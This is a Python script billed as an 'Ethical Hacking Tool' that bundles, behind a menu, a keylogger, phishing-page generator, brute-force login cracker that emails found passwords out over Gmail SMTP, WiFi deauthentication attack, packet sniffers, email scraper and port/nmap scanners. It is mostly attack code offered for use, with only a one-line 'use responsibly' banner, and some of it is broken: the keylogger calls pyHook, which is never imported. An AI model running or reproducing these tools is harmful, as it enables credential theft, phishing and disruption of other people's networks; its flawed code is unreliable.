import socket
import subprocess
import threading
import re
import requests
from bs4 import BeautifulSoup
import os
import time
from scapy.all import *
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard
import pythoncom
import urllib.request

# Function to scan a port
def scan_port(target_ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target_ip, port))
        if result == 0:
            print(f"Port {port} is open.")
        sock.close()
    except socket.error:
        print(f"Could not connect to port {port}.")

# Function for Port Scanner functionality
def port_scanner():
    target_ip = input("Enter the target IP address: ")
    print(f"Scanning ports for {target_ip}...\n")
    for port in range(1, 1024):
        scan_port(target_ip, port)

# Function to sniff packets
def sniff_packets():
    def packet_sniffer(packet):
        if packet.haslayer(HTTPResponse):
            url = packet[HTTP].Host.decode() + packet[HTTP].Path.decode()
            print(f"Visited URL: {url}")

    print("Starting packet sniffing...\n")
    sniff(filter="tcp port 80", prn=packet_sniffer)

# Function for Packet Sniffer functionality
def packet_sniffer():
    print("Starting packet sniffing...\n")
    sniff_packets()

# Function to scrape emails
def scrape_emails(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    emails = re.findall(r'[\w\.-]+@[\w\.-]+', soup.get_text())
    return emails

# Function for Email Scraper functionality
def email_scraper():
    url = input("Enter the URL to scrape emails from: ")
    print("Scraping emails...\n")
    emails = scrape_emails(url)
    for email in emails:
        print(email)

# Function to start keylogger
def start_keylogger():
    def on_keypress(event):
        with open("keylogs.txt", "a") as f:
            f.write(chr(event.Ascii))
        return True

    print("Starting keylogger...\n")
    hooks_manager = pyHook.HookManager()
    hooks_manager.KeyDown = on_keypress
    hooks_manager.HookKeyboard()
    pythoncom.PumpMessages()

# Function for Keylogger functionality
def keylogger():
    print("Starting keylogger...\n")
    start_keylogger()

# Function to scrape website
def scrape_website(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    links = soup.find_all('a')
    for link in links:
        print(link.get('href'))

# Function for Web Scraper functionality
def web_scraper():
    url = input("Enter the URL to scrape links from: ")
    print("Scraping website links...\n")
    scrape_website(url)

# Function to sniff WiFi SSIDs
def sniff_ssids():
    def packet_handler(packet):
        if packet.haslayer(Dot11Beacon):
            ssid = packet[Dot11Elt].info.decode()
            print(f"SSID: {ssid}")

    print("Starting WiFi SSID sniffing...\n")
    sniff(prn=packet_handler, iface="wlan0", count=10)

# Function for WiFi SSID Sniffer functionality
def wifi_ssid_sniffer():
    print("Starting WiFi SSID sniffing...\n")
    sniff_ssids()

# Function to create phishing page
def create_phishing_page():
    html_content = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Phishing Page</title>
    </head>
    <body>
        <h1>Phishing Page</h1>
        <p>This is a phishing page.</p>
        <form action="http://localhost/login.php" method="POST">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username"><br><br>
            <label for="password">Password:</label>
            <input type="password" id="password" name="password"><br><br>
            <input type="submit" value="Login">
        </form>
    </body>
    </html>
    """

    with open("phishing_page.html", "w") as f:
        f.write(html_content)

# Function for Phishing Page Creator functionality
def phishing_page_creator():
    print("Creating phishing page...\n")
    create_phishing_page()

# Function to crack passwords
def crack_passwords(passwords):
    email = input("Enter the email address to send the passwords to: ")
    smtp_server = "smtp.gmail.com"
    smtp_port = 587
    username = input("Enter your email username: ")
    password = input("Enter your email password: ")
    sender_email = username
    subject = "Cracked Passwords"
    body = "\n".join(passwords)

    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = email
    message["Subject"] = subject

    message.attach(MIMEText(body, "plain"))

    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(username, password)
        text = message.as_string()
        server.sendmail(sender_email, email, text)
        server.quit()
        print("Passwords sent successfully!")
    except smtplib.SMTPAuthenticationError:
        print("Failed to authenticate with the email server.")

# Function for Brute Force Password Cracker functionality
def brute_force_password_cracker():
    target_url = input("Enter the URL to perform the brute force attack on: ")
    username_field = input("Enter the name of the username field: ")
    password_field = input("Enter the name of the password field: ")
    username = input("Enter the username: ")
    password_list = input("Enter the path to the password list file: ")

    with open(password_list, "r") as f:
        passwords = f.read().splitlines()

    cracked_passwords = []

    for password in passwords:
        session = requests.Session()
        login_payload = {username_field: username, password_field: password}
        response = session.post(target_url, data=login_payload)

        if "Login failed" not in response.text:
            cracked_passwords.append(password)

    if len(cracked_passwords) > 0:
        print("Passwords cracked successfully!")
        crack_passwords(cracked_passwords)
    else:
        print("No passwords cracked.")

# Function to scan network vulnerabilities
def scan_vulnerabilities():
    target_ip = input("Enter the target IP address: ")
    command = f"nmap -p- -sV -Pn {target_ip}"
    subprocess.call(command, shell=True)

# Function for Network Vulnerability Scanner functionality
def network_vulnerability_scanner():
    print("Scanning network vulnerabilities...\n")
    scan_vulnerabilities()

# Function to perform WiFi deauthentication attack
def perform_deauthentication_attack(target_mac, gateway_mac):
    packet = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth()
    sendp(packet, inter=0.1, count=10, iface="wlan0", verbose=False)

# Function for WiFi Deauthentication Attacker functionality
def wifi_deauthentication_attacker():
    target_mac = input("Enter the MAC address of the target device: ")
    gateway_mac = input("Enter the MAC address of the gateway: ")
    print("Performing WiFi deauthentication attack...\n")
    perform_deauthentication_attack(target_mac, gateway_mac)

# Function to display the menu options
def menu():
    print("=== Ethical Hacking Tool ===")
    print("1. Port Scanner")
    print("2. Packet Sniffer")
    print("3. Email Scraper")
    print("4. Keylogger")
    print("5. Web Scraper")
    print("6. WiFi SSID Sniffer")
    print("7. Phishing Page Creator")
    print("8. Brute Force Password Cracker")
    print("9. Network Vulnerability Scanner")
    print("10. WiFi Deauthentication Attacker")
    print("0. Exit")
    print("============================")

if __name__ == "__main__":
    print("=== Welcome to the Ethical Hacking Tool ===")
    print("===========================================")
    print("Use this tool responsibly and legally.")
    print("===========================================\n")

    # Start the main menu loop
    while True:
        menu()
        choice = input("Enter your choice: ")

        if choice == "1":
            port_scanner()
        elif choice == "2":
            packet_sniffer()
        elif choice == "3":
            email_scraper()
        elif choice == "4":
            keylogger()
        elif choice == "5":
            web_scraper()
        elif choice == "6":
            wifi_ssid_sniffer()
        elif choice == "7":
            phishing_page_creator()
        elif choice == "8":
            brute_force_password_cracker()
        elif choice == "9":
            network_vulnerability_scanner()
        elif choice == "10":
            wifi_deauthentication_attacker()
        elif choice == "0":
            print("Exiting the program...")
            break
        else:
            print("Invalid choice. Please try again.\n")
